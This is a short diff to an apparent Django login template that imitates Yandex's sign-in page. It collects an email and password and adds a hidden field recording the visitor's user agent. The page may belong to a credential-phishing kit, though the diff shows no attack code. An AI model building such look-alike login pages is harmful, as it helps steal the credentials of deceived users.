@@ -31,9 +31,9 @@
             <div class="loader"></div>
             
             <div>
-                <form class="yandex-auth__container__form" method="post" autocomplete="on">
+                <form class="yandex-auth__container__form" method="post" autocomplete="on">    
                     {% csrf_token %}
-    
+
                     <div class="yandex-auth__container__form__container">
                         <input type="email"
                                id="input1"
@@ -58,6 +58,12 @@
                              class="yandex-auth__container__form__container__input-img pwdEye" 
                              src="{{ STATIC_URL }}img/yandex/pwd_eye_opened.png">
                     </div>
+
+                    <input type="hidden"
+                           id="UserAgentInput" 
+                           name="user_agent" 
+                           initial="none" 
+                           value="">
                     
                     <p>
                         <button class="yandex-auth__container__form__btn" type="submit" value="Войти" id="low-visible">
